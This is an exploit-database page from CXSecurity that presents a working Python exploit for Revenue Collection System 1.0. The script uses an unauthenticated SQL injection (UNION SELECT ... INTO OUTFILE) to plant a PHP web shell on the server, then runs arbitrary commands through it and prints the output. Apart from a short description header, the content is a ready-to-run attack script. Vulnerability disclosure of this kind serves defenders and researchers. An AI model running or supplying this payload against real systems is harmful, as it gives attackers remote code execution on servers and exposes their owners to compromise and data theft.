---
title: Revenue Collection System 1.0 SQL Injection / Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2022110026
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-18
fetch_date: 2025-10-03T23:05:04.886230
---

# Revenue Collection System 1.0 SQL Injection / Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Revenue Collection System 1.0 SQL Injection / Remote Code Execution** **2022.11.17**  Credit:  **[Joe Pollock](https://cxsecurity.com/author/Joe%2BPollock/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: Revenue Collection System v1.0 - RCE via Unauthenticated SQL Injection
# Exploit Author: Joe Pollock
# Date: November 16, 2022
# Vendor Homepage: https://www.sourcecodester.com/php/14904/rates-system.html
# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/rates.zip
# Tested on: Kali Linux, Apache, Mysql
# CVE: T.B.C
# Vendor: Kapiya
# Version: 1.0
# Exploit Description:
# Revenue Collection System v1.0 suffers from an unauthenticated SQL Injection Vulnerability, in step1.php, allowing remote attackers to
# write a malicious PHP file to disk. The resulting file can then be accessed within the /rates/admin/DBbackup directory.
# This script will write the malicious PHP file to disk, issue a user-defined command, then retrieve the result of that command.
# Ex: python3 rcsv1.py 10.10.14.2 "ls"
import sys, requests
def main():
if len(sys.argv) != 3:
print("(+) usage: %s <target> <cmd>" % sys.argv[0])
print('(+) eg: %s 192.168.121.103 "ls"' % sys.argv[0])
sys.exit(-1)
targetIP = sys.argv[1]
cmd = sys.argv[2]
s = requests.Session()
# Define obscure filename and command parameter to limit exposure and usage of the RCE.
FILENAME = "youcantfindme.php"
CMDVAR = "ohno"
# Define the SQL injection string
sqli = """'+UNION+SELECT+"<?php+echo+shell\_exec($\_GET['%s']);?>","","","","","","","","","","","","","","","",""+INTO+OUTFILE+'/var/www/html/rates/admin/DBbackup/%s'--+-""" % (CMDVAR,FILENAME)
# Write the PHP file to disk using the SQL injection vulnerability
url1 = "http://%s/rates/index.php?page=step1&proId=%s" % (targetIP,sqli)
r1 = s.get(url1)
# Execute the user defined command and display the result
url2 = "http://%s/rates/admin/DBbackup/%s?%s=%s" % (targetIP,FILENAME,CMDVAR,cmd)
r2 = s.get(url2)
print(r2.text)
if \_\_name\_\_ == '\_\_main\_\_':
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110026)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top